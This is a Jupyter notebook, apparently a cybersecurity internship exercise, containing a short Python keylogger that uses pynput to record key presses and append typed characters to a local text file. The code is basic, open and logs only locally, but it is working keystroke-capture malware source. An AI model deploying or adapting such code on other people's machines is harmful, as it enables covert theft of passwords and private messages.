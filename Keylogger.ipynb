{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPdsEbQiqaVEHIO9JFfUUT0",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Vyshu0401/PRODIGY_CS_04/blob/main/Keylogger.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "xhC6_MMD90-4"
      },
      "outputs": [],
      "source": [
        "from pynput import keyboard\n",
        "def keyPressed(key):\n",
        "    print(str(key))\n",
        "    with open(\"keyfile1.txt\", 'a') as logkey:\n",
        "        try:\n",
        "            char = key.char\n",
        "            logkey.write(char)\n",
        "        except:\n",
        "            print(\"Error getting char\")\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    listener = keyboard.Listener(on_press=keyPressed)\n",
        "    listener.start()\n",
        "    input()"
      ]
    }
  ]
}